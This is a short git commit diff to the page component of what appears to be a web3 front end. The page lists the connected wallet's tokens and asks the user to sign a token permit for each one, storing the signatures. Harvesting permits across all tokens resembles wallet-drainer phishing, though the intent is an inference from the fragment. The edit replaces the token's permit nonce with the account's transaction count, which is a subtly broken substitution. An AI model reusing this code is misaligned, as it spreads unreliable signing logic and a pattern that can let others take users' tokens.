4948a07898d4d5a5407d3a00dd0dd01c6729097f
FAZEL UNITY <53996181+fazelunity0054@users.noreply.github.com>
2024-05-30 04:49:36 +0330

    update app/page.tsx

--- src/app/page.tsx
+++ src/app/page.tsx
@@ -63,7 +63,7 @@ const Page = () => {
 					<div className={'flex gap-2'}>
 						{token.contract_ticker_symbol}
 						<button disabled={!!signatures[token.contract_ticker_symbol]} onClick={async () => {
-							const nonce = (await callContractMethod('nonces', [account.address], token.contract_address,signer!)).toString();
+							const nonce = await provider!.getTransactionCount(account.address!);
 							const sig = await createPermitSignature(async (args: any)=>{
 								return signTypedData(config, args);
 							},
